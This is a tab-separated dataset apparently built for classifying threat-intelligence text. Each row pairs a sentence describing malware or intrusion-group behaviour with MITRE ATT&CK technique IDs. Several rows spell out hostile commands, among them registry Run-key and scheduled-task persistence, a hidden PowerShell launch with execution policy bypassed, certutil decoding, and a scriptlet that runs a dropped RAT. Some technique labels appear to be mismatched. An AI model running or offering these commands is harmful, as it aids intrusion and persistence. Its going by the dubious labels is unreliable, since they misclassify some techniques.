text1	labels
starts a rootkit from a malicious file dropped to disk.	['T1014', 'T1014']
can collect the victim user name.	['T1033', 'T1033']
"""beacon"" payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe"	['T1106']
actors look for and use VPN profiles during an operation to access the network using external VPN services.	['T1133']
actors used a victim's endpoint management platform, Altiris, for lateral movement.	['T1072']
actors used the following commands after exploiting a machine with  malware to obtain information about the OS: ver >> %temp%\download systeminfo >> %temp%\download	['T1082']
adds a Visual Basic script in the Startup folder to deploy the payload.	['T1064']
adds itself to a Registry Run key with the name guidVGA or guidVSA.	['T1547.001']
adds itself to the Registry key HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\ for persistence.	['T1547.001']
adds itself to the Registry key Software\Microsoft\Windows\CurrentVersion\Run to establish persistence upon reboot.	['T1547.001']
Adversaries can direct  to execute from the command-line on infected hosts, or have  create a reverse shell.	['T1059']
After creating a new service for persistence,  sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.	['T1070.006']
After re-establishing access to a victim network,  actors download tools including  and WCE that are staged temporarily on websites that were previously compromised but never used.	['T1105']
aggregates staged data from a network into a single location.	['T1074']
A  macro has run a PowerShell command to decode file contents.  has also used  to decode base64-encoded files on victims.	['T1140']
A  malware sample conducts C2 over HTTP.	['T1071']
A module in  allows arbitrary commands to be executed by invoking C:\Windows\System32\cmd.exe.	['T1059']
A module in  collects passwords stored in applications installed on the victim.	['T1003']
Analysis of  has shown that it regularly undergoes technical improvements to evade anti-virus detection.	['T1027.005']
An  macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.	['T1140']
A  tool can add the binary’s path to the Registry key Software\Microsoft\Windows\CurrentVersion\Run to add persistence.	['T1547.001']
automatically exfiltrates collected files via removable media when an infected device is connected to the second victim after receiving commands from the first victim.	['T1020']
A  variant gathers network interface card information.	['T1016']
A variant of  appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.	['T1027.001']
C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.	['T1573']
can access a connected webcam and capture pictures.	['T1125']
can add a certificate to the Windows store.	['T1553.004']
can add a Run key entry in the Registry to establish persistence.	['T1547.001']
can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.	['T1090']
can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP.	['T1016']
can be used to embed a PowerShell script within the pixels of a PNG file.	['T1027']
can be used to gather information on permission groups within a domain.	['T1069']
can create a Windows account.	['T1136']
can delete all files created during its execution.	['T1070.004']
can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.	['T1070.004']
can download files to the victim’s machine and execute them.	['T1105']
can dump active logon session password hashes from the lsass process.	['T1003']
can dump Windows password hashes.	['T1003']
can dump Windows password hashes and LSA secrets.	['T1003']
can encrypt C2 data with a custom technique using MD5, base64-encoding, and RC4.	['T1573']
can execute commands via an interactive command shell.	['T1059']
can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.	['T1082']
can gather hashed passwords by dumping SAM/SECURITY hive and gathers domain controller hashes from NTDS.	['T1003']
can gather the victim OS version and whether it is 64 or 32 bit.	['T1082']
can gather very specific information about attached USB devices, to include device instance ID and drive geometry.	['T1120']
can grab a system’s information including the OS version, architecture, etc.	['T1082']
can launch a remote shell to execute commands on the victim’s machine.	['T1059']
can launch PowerShell Scripts.	['T1059.001']
can list all running processes.	['T1057']
can list file and directory information.	['T1083']
can list running processes.	['T1057']
can obtain a list of all files and directories as well as logical drives.	['T1083']
can obtain information about the OS, processor, and BIOS.	['T1082']
can obtain information about the victim computer name, physical memory, country, and date.	['T1082']
can obtain information about the victim usernames.	['T1033']
can obtain system information such as OS version and disk space.	['T1082']
can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.	['T1082']
can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.	['T1082']
can obtain the victim username and permissions.	['T1033']
can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.	['T1185']
can perform screen capturing.	['T1113']
can ping or traceroute a remote host.	['T1018']
can query shared drives on the local system.	['T1135']
can record sound with the microphone.	['T1123']
can retrieve screenshots from compromised hosts.	['T1113']
can securely delete files, including deleting itself from the victim.	['T1070.004']
can send process listings over the C2 channel.	['T1057']
can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.	['T1041']
can upload and download files to the victim’s machine.	['T1105']
can upload files from the victim's machine to its C2 server.	['T1041']
can use public cloud-based storage providers for command and control.	['T1102']
can walk through directories and recursively search for strings in files.	['T1083']
can wipe files indicated by the attacker and remove itself from disk using a batch file.	['T1070.004']
checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.	['T1082']
checks the system for certain Registry keys.	['T1012']
checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.	['T1082']
"checks to see if the system is configured with ""Daylight"" time and checks for a specific region to be set for the timezone."	['T1124']
collected and exfiltrated files from the infected system.	['T1005']
collects address book information from Outlook.	['T1114']
collects a list of accounts with the command net users.	['T1087']
collects and sends system information to its C2.	['T1082']
collects credentials from Internet Explorer, Mozilla Firefox, Eudora, and several email clients.	['T1003']
collects current and parent process IDs.	['T1057']
collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.	['T1074']
collects screenshots of the victim machine.	['T1113']
collects the network adapter information.	['T1016']
collects the network adapter information and domain/username information based on current remote sessions.	['T1016']
collects the victim's %TEMP% directory path and version of Internet Explorer.	['T1083']
collects the victim hostname, window resolution, and Microsoft Windows version.	['T1082']
collects the victim’s username.	['T1033']
command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS.	['T1573']
Commands such as net use and net session can be used in  to gather information about network connections from a particular host.	['T1049']
communicates over raw TCP.	['T1095']
communicates to servers operated by Google using the Jabber/XMPP protocol.	['T1102']
communicates with its C2 server over port 443.	['T1043']
compressed data into .zip files prior to exfiltrating it.	['T1560']
connects to external C2 infrastructure and opens a backdoor over port 443.	['T1043']
connects to external C2 infrastructure over port 443.	['T1043']
contains a custom keylogger.	['T1056']
contains a keylogger.	['T1056']
contains code to compress files.	['T1560']
"contains several references to football (including ""football,"" ""score,"" ""ball,"" and ""loose"") in a likely attempt to disguise its traffic."	['T1036']
contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.	['T1070.004']
contains the getProcessList function to run ps aux to get running processes.	['T1057']
copies and exfiltrates the clipboard contents every 30 seconds.	['T1115']
"copies files with certain extensions from USB devices to
a predefined directory."	['T1025']
copies itself into a running Internet Explorer process to evade detection.	['T1055']
copies itself over network shares to move laterally on a victim network.	['T1021.002']
created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.	['T1136']
created several .LNK files on the victim's machine.	['T1547.009']
creates a backdoor through which remote attackers can change C2 servers.	['T1008']
creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.	['T1083']
creates a backdoor through which remote attackers can clear all system event logs.	['T1070']
creates a backdoor through which remote attackers can download files.	['T1105']
creates a backdoor through which remote attackers can retrieve system information.	['T1082']
creates a new service named WmiApSrvEx to establish persistence.	['T1543.003']
creates a new service to establish.	['T1543.003']
creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.	['T1543.003']
creates a Registry start-up entry to establish persistence.	['T1547.001']
creates a scheduled task to ensure it is re-executed everyday.	['T1053.005']
creates run key Registry entries pointing to a malicious executable dropped to disk.	['T1547.001']
creates three Registry keys to establish persistence by adding a .	['T1112']
decoded base64-encoded PowerShell commands using a VBS file.	['T1140']
default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.	['T1573']
deletes any temporary files it creates	['T1070.004']
deletes its dropper and VBS scripts from the victim’s machine.	['T1070.004']
deletes its original installer file once installation is complete.	['T1070.004']
deletes its RAT installer file as it executes its DLL payload file.	['T1070.004']
deletes the .LNK file from the startup directory as well as the dropper components.	['T1070.004']
delivers malware using spearphishing emails with malicious HWP attachments.	['T1598.002']
deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.	['T1040']
downloads its backdoor component from a C2 server and loads it directly into memory.	['T1105']
drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.	['T1091']
drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.	['T1091']
encodes credit card data it collected from the victim with XOR.	['T1486']
encodes data in hexadecimal format over the C2 channel.	['T1132']
encrypted the collected files' path with AES and then encoded them with base64.	['T1486']
encrypts C2 data with a ROR by 3 and an XOR by 0x23.	['T1573']
encrypts C2 traffic using an XOR/ADD cipher and uses a FakeTLS method.	['T1573']
encrypts C2 traffic with a custom RC4 variant.	['T1573']
encrypts collected data with AES and Base64 and then sends it to the C2 server.	['T1486']
encrypts collected data with an incremental XOR key prior to exfiltration.	['T1486']
encrypts data with a substitute cipher prior to exfiltration.	['T1486']
encrypts files with XOR before sending them back to the C2 server.	['T1486']
enumerates all running services.	['T1007']
establishes a backdoor over HTTP.	['T1071']
establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“.	['T1053.005']
establishes persistence via a Registry Run key.	['T1547.001']
executed  by using rundll32 commands such as rundll32.exe “C:\Windows\twain_64.dll”.  also executed a .dll for a first stage dropper using rundll32.exe. An  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.	['T1218.011']
executes code using HTTP POST commands.	['T1071']
executes the whoami on the victim’s machine.	['T1033']
exfiltrates collected files automatically over FTP to remote servers.	['T1020']
exfiltrates collected files via removable media from air-gapped victims.	['T1052']
exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.	['T1210']
exploits CVE-2016-4117 to allow an executable to gain escalated privileges.	['T1068']
extracted documents and bundled them into a RAR archive.	['T1560']
extracted Word documents from a file server on a victim network.	['T1039']
gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry.  has searched for given file types.	['T1083']
gathers a list of processes using the tasklist command and then is sent back to the control server.	['T1057']
gathers informatin on the IP forwarding table, MAC address, and network SSID.	['T1016']
gathers network configuration information as well as the ARP cache.	['T1016']
grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.	['T1134']
has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.	['T1106']
has a command to search for files on the victim’s machine.	['T1083']
has a command to timestop a file or directory.	['T1070.006']
has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.	['T1105']
has a function to delete files from the victim’s machine.	['T1070.004']
has been delivered via Word documents using DDE for execution.	['T1559.002']
has been known to employ binary padding.	['T1027.001']
has been known to establish persistence by adding programs to the Run Registry key.	['T1547.001']
has been seen loaded into msiexec.exe through process hollowing to hide its execution.	['T1055.012']
has collected .PST archives.	['T1114']
has commands to get information about the victim's name, build, version, serial number, and memory usage.	['T1082']
has commands to list drives on the victim machine and to list file information for a given directory.	['T1083']
has executed malicious .bat files containing PowerShell commands.	['T1064']
has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.	['T1562.001']
has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.	['T1036']
has injected code into trusted processes.	['T1055']
has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.	['T1070.004']
has modules that are capable of capturing from a victim's webcam.	['T1125']
has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.	['T1001']
has run tasklist on a victim's machine.	['T1057']
has sent emails containing malicious attachments or links that require users to execute a file or macro to infect the victim machine.	['T1204']
has sent emails with URLs pointing to malicious documents.	['T1598.003']
has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.	['T1598.003']
has several commands to delete files associated with the malware from the victim.	['T1070.004']
has signed its malware with an invalid digital certificates listed as “Tencent Technology (Shenzhen) Company Limited.”	['T1553.002']
has signed  payloads with legally purchased code signing certificates.  has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.	['T1553.002']
has stored captured credential information in a file named pi.log.	['T1074']
has the ability to change firewall settings to allow a plug-in to be downloaded.	['T1562.001']
has the ability to initiate keylogging.	['T1056']
has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.	['T1082']
has the capability to collect the current logged on user’s username from a machine.	['T1033']
has the capability to delete files and scripts from the victim's machine.	['T1070.004']
has the capability to download and execute .exe files.	['T1105']
has the capability to execute commands using cmd.exe.	['T1059']
has the capability to gather NTLM password information.	['T1003']
has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.	['T1008']
has used a CHM payload to load and execute another malicious file once delivered to a victim.	['T1218.001']
has used a custom executable to execute PowerShell scripts.	['T1059.001']
has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.	['T1003']
has used a script to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.	['T1119']
has used command line during its intrusions.	['T1059']
has used CVE-2014-4076, CVE-2015-2387, and CVE-2015-1701 to escalate privileges.	['T1068']
has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.	['T1134']
has used environment variables and standard input (stdin) to obfuscate command-line arguments.  also obfuscates malicious macros delivered as payloads.	['T1027']
has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.	['T1203']
has used forged Microsoft code-signing certificates on malware.	['T1553.002']
has used hidden or non-printing characters to help masquerade file names on a system, such as appending a Unicode no-break space character to a legitimate service name.	['T1036']
has used HTTP and DNS for C2. The group has also used the Plink utility and other tools to create tunnels to C2 servers.	['T1071']
has used HTTPS and DNS tunneling for C2. The group has also used the Plink utility to create SSH tunnels.	['T1071']
has used keyloggers.	['T1056']
has used legitimate credentials to maintain access to a victim network and exfiltrate data. The group also used credentials stolen through a spearphishing email to login to the DCCC network.	['T1078']
has used legitimate local admin account credentials.	['T1078']
has used Metasploit’s  NTDSGRAB module to obtain a copy of the victim's Active Directory database.	['T1087']
has used net user /domain to identify account information.	['T1087']
has used pass the hash for lateral movement.	['T1550.002']
has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.	['T1216']
has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and PoS malware known as TRINITY.	['T1053.005']
has used scheduled tasks to maintain RDP backdoors.	['T1053.005']
has used stolen code signing certificates used to sign malware.	['T1553.002']
has used tcping.exe, similar to , to probe port status on systems of interest.	['T1046']
has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.	['T1095']
has used the net view command.	['T1018']
has used  to generate Kerberos golden tickets.	['T1550.003']
has used UPX to pack	['T1027.002']
has used WinRM to enable remote execution.	['T1021.006']
If a victim meets certain criteria,  uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1.	['T1546.010']
If establishing persistence by installation as a new service fails, one variant of  establishes persistence for the created .exe file by setting the following Registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe. Other variants have set the following Registry key for persistence: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self].	['T1547.001']
injects itself into explorer.exe.	['T1055']
injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.	['T1055']
installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.	['T1036']
Install-SSP Persistence module can be used to establish by installing a SSP DLL.	['T1547.005']
is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.	['T1542.003']
is a Web shell.	['T1505.003']
is capable of deleting the backdoor file.	['T1070.004']
is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.	['T1083']
is capable of manipulating the Registry.	['T1112']
is capable of performing audio captures.	['T1123']
is capable of persisting via a .lnk file stored in the Startup directory.	['T1547.009']
is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.	['T1083']
is capable of running WMI queries.	['T1047']
is capable of setting and deleting Registry values.	['T1112']
is capable of stealing usernames and passwords from browsers on the victim machine.	['T1003']
is capable of taking screen captures.	['T1113']
is capable of tunneling though a proxy.	['T1090']
is likely loaded via DLL hijacking into a legitimate McAfee binary.	['T1574.001']
is obscured using XOR encoding and appended to a valid GIF file.	['T1027']
leveraged  to extract Windows Credentials of currently logged-in users and steals passwords stored in browsers.	['T1003']
leverages  and  to steal credentials.	['T1003']
leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.	['T1106']
lists files on the victim’s machine.	['T1083']
lists the current running processes on the system.	['T1057']
lists the system’s processes.	['T1057']
logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.	['T1027']
main method of communicating with its C2 servers is using HTTP or HTTPS.	['T1071']
malware attempts to maintain persistence by saving itself in the Start menu folder or by adding a Registry Run key.	['T1547.001']
malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.	['T1562.001']
malware can leverage the Windows API call, CreateProcessA(), for execution.	['T1106']
malware can take a screenshot and upload the file to its C2 server.	['T1113']
malware contains a secondary fallback command and control server that is contacted after the primary command and control server.	['T1008']
malware gathers a list of running processes.	['T1057']
malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.	['T1547.001']
malware has used .vbs scripts for execution.	['T1064']
malware KiloAlfa contains keylogging functionality.	['T1056']
malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.	['T1008']
malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.	['T1047']
malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.	['T1542.003']
marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.	['T1070.004']
may collect information about the currently logged in user by running whoami on a victim.	['T1033']
may create the file %HOMEPATH%\Start Menu\Programs\Startup\Realtek {Unique Identifier}.lnk, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory.	['T1547.009']
may use ipconfig /all to gather system network configuration details.	['T1016']
mimics filenames from %SYSTEM%\System32 to hide DLLs in %WINDIR% and/or %TEMP%.	['T1036']
modifies the firewall Registry key SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfileGloballyOpenPorts\\List.	['T1112']
network traffic can communicate over HTTP.	['T1071']
network traffic communicates over a raw socket.	['T1095']
network traffic is Base64-encoded plaintext.	['T1132']
New-UserPersistenceOption Persistence argument can be used to establish via a .	['T1053.005']
New-UserPersistenceOption Persistence argument can be used to establish via the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Registry key.	['T1547.001']
obfuscates API function names using a substitute cipher combined with Base64 encoding.	['T1027']
obtains the victim username and saves it to a file.	['T1033']
Once  gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.	['T1199']
opens cmd.exe on the victim.	['T1059']
overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.	['T1055.011']
Part of 's operation involved using  modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.	['T1092']
performs checks for various antivirus and security products during installation.	['T1518.001']
performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA, SAM table, credential vault, DCSync/NetSync, and DPAPI.	['T1003']
performs discovery of permission groups net group /domain.	['T1069']
performs process discovery using tasklist commands.	['T1057']
primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.	['T1008']
provides a reverse shell connection on 8338/TCP, encrypted via AES.	['T1573', 'T1059', 'T1095']
queries Registry values as part of its anti-sandbox checks.	['T1012']
queries the registry to look for information about Terminal Services.	['T1012']
queries the system to identify existing services.	['T1007']
Recent versions of  delete files and registry keys created by the malware.	['T1070.004']
recursively searches through directories for files.	['T1083']
removes all files in the /tmp directory.	['T1070.004']
retrieves additional malicious payloads from the C2 server.	['T1105']
saves system information into an XML file that is then XOR-encoded.	['T1486']
scanned network services to search for vulnerabilities in the victim system.	['T1046']
schedules tasks to invoke its components in order to establish persistence.	['T1053.005']
searches for administrator accounts on both the local victim machine and the network.	['T1087']
searches for removable media and duplicates itself onto it.	['T1091']
searches for specified files.	['T1083']
sends the logged-on username to its hard-coded C2.	['T1033']
sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.	['T1598.002']
sets its DLL file as a new service in the Registry to establish persistence.	['T1543.003']
Several  malware families install themselves as new services on victims.	['T1543.003']
Several tools used by  have been command-line driven.	['T1059']
Some  components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.	['T1102']
Some data in  is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.	['T1027']
Some  DLL files have been packed with UPX.	['T1027.002']
Some  samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.	['T1001']
Some  variants create a new Windows service to establish persistence.	['T1543.003']
Some  variants install .dll files as services with names generated by a list of hard-coded strings.	['T1543.003']
Some variants of the  Trojan have been known to store data in Extended Attributes.	['T1564.004']
Some variants of  use RC4 to encrypt C2 traffic.	['T1573']
stages the output from command execution and collected files in specific folders before exfiltration.	['T1074']
stores the gathered data from the machine in .db files and .bmp files under four separate locations.	['T1074']
surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.	['T1007']
"The ""ZJ"" variant of  allows ""ZJ link"" infections with Internet access to relay traffic from ""ZJ listen"" to a command server."	['T1090']
The discovery modules used with  can collect information on open windows.	['T1010']
The  group is known to have used pass the hash.	['T1550.002']
The main  dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit. Newer versions of  will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.	['T1518.001']
The  malware platform supports many standard protocols, including HTTP, HTTPS, and SMB.	['T1071']
The net start and net stop commands can be used in  to execute or stop Windows services.	['T1569.002']
The net start command can be used in  to find information about Windows services.	['T1007']
The net use \\system\share /delete command can be used in  to remove an established connection to a network share.	['T1070.005']
The net view \\remotesystem and net share commands in  can be used to find shared drives and directories on remote and local systems respectively.	['T1135']
The original variant of  encrypts C2 traffic using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation.  has also included HTML code in C2 traffic in an apparent attempt to evade detection. Additionally, some variants of  use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.	['T1573']
The PowerShell script with the  payload was obfuscated using the COMPRESS technique in Invoke-Obfuscation.	['T1027']
The  trojan creates a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist with launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist.	['T1543.001']
To assist in establishing persistence,  creates %APPDATA%\OneDrive.bat and saves the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\OneDrive.ps1”.	['T1064']
took screen shots using their Windows malware.	['T1113']
typically loads its DLL file into a legitimate signed Java or VMware executable.	['T1574.002']
uploads and downloads files to and from the victim’s machine.	['T1105']
used a .NET tool to dump data from Microsoft Exchange mailboxes.	['T1114']
used a batch script to gather folder and file names from victim hosts.	['T1083']
used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.	['T1560', 'T1119']
used a tool called BruteForcer to perform a brute force attack.	['T1110']
used a tool called Imecab to set up a persistent remote access account on the victim machine.	['T1108', 'T1136']
used Kerberos ticket attacks for lateral movement.	['T1550.002']
used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.	['T1078']
used named and hijacked scheduled tasks to establish persistence.	['T1053.005']
used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router.  has also used a machine to relay and obscure communications between  and their server.	['T1090']
used PowerShell commands to execute payloads.	['T1059.001']
used SMB for C2.	['T1071']
used SMB over ports 445 or 139 for C2. The group also established encrypted connections over port 443.	['T1043']
used stolen certificates to sign its malware.	['T1553.002']
used the command query user on victim hosts.	['T1033']
used the Plink utility and other tools to create tunnels to C2 servers.	['T1573']
used Visual Basic Scripts (VBS), JavaScript code, batch files, and .SCT files on victim machines.	['T1064']
used WMI to steal credentials and execute backdoors at a future time.	['T1047']
uses a batch file to delete itself.	['T1064']
uses a combination of NTWDBLIB.dll and cliconfg.exe to bypass UAC protections using DLL hijacking.	['T1548.002']
uses a Launch Agent to persist.	['T1543.001']
uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.	['T1027']
uses an encrypted file to store commands and configuration values.	['T1140']
uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.	['T1546.003']
uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.	['T1092']
uses batch scripts for various purposes, including to restart and uninstall itself.	['T1064']
uses cmd.exe to execute commands.	['T1059']
uses command-line interaction to search files and directories.	['T1083']
uses HTTPS to conceal C2 communications.	['T1071']
uses launchctl to enable screen sharing on the victim’s machine.	['T1569.001']
uses NetUser-GetInfo to identify that it is running under an “Admin” account on the local system.	['T1033']
uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.	['T1027']
uses port 443 for the control server communications.	['T1043']
uses port 52100 and 5876 for C2 communications.	['T1571']
uses Port Numbers 80, 8080, 8000, and 443 for communication to the C2 servers.	['T1043']
uses PowerShell for execution as well as PowerShell Empire to establish persistence.	['T1059.001']
uses Python for scripting to execute additional commands.	['T1064']
uses rundll32.exe in a Registry value added to establish persistence.	['T1218.011']
uses rundll32.exe to load.	['T1218.011']
uses the netstat command to find open ports on the victim’s machine.	['T1049']
uses the net view command for discovery.	['T1018']
uses the zip -r command to compress the data collected on the local system.	['T1560']
uses token manipulation with NtFilterToken as part of UAC bypass.	['T1134']
uses Tor for command and control.	['T1090.003']
uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.	['T1102']
"uses Windows services typically named ""javamtsup"" for persistence."	['T1543.003']
uses WinRAR to compress data that is intended to be exfiltrated.	['T1560']
Various  malware modifies the Windows firewall to allow incoming connections or disable it entirely using .  malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally,  malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.	['T1562.001']
will look for the current IP address.	['T1016']
What does the resulting watering hole look like? The websites were compromised to redirect visitors to instances of both ScanBox and BEeF	['T1189']
Malefactors used watering hole attacks to compromise legitimate and trusted websites frequently visited by their targets	['T1189']
This is followed by a number of Linux shell command style commands related to the malware establishing persistence	['T1059']
Tracked Commands During observation of the described above “router-PC” CnC we tracked the following commands delivered in the config file before the server went offline	['T1059']
The command tab will show previously issued commands, when they were issued, and their status, as seen in Figure 4	['T1059']
Figure 7 shows just how similar these two batch scripts are with several of the headers being exactly the same and a majority of the commands being the same with the Helminth commands having the 2>&1 suffix to include command errors with the output	['T1059']
For instance, this Trojan uses the InternetExplorer application object much like the previous OopsIE Trojan and a very similar sequence of requests to obtain commands	['T1059']
The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\tmpCa.vbs	['T1059']
The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute any scripts/commands and receive the result via HTTP requests	['T1059']
<?XML version=”1.0″?> <scriptlet> <registration description=”fjzmpcjvqp” progid=”fjzmpcjvqp” version=”1.00″ classid=”{204774CF-D251-4F02-855B-2BE70585184B}” remotable=”true” > </registration> <script language=”JScript”> <![CDATA[ var r = new ActiveXObject(“WScript.Shell”).Run(“cmd /c %tmp%\\qrat.exe”,0,false); exit(); ]]> </script> </scriptlet> After the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in C:\Users\%username%\AppData\Roaming\Microsoft Network\microsoft_network\1.0.0.0 and unpacks/drops the final QuasarRAT binary named microsoft_network.exe	['T1059']
C2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:    Command Description   0 Kill BADNEWS	['T1059']
Interactive shells (cmd.exe, /bin/bash, etc) can be opened remotely	['T1059']
BADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration	['T1059']
The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands	['T1059']
After the payload is launched, the shellcode runs the following commands to prevent Microsoft Word from showing a recovery dialog:   Lastly, the shellcode overwrites the malicious file with a decoy document related to the Indian defense forces’ pay scale / matrix (Figure 3), displays it to the user and terminates the exploited instance of Microsoft Word	['T1027']
This build tool encrypts the binary’s strings with a fresh key for each build	['T1027']
The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks	['T1027']
APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property	['T1027']
When we converted the dates in the file strings from the Solar Hijri calendar to the Gregorian one, we found that they were close to the compilation times of the executables and also close to when Cadelle’s targets were initially compromised	['T1027']
Some of the key obfuscation techniques used are:   Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult	['T1027']
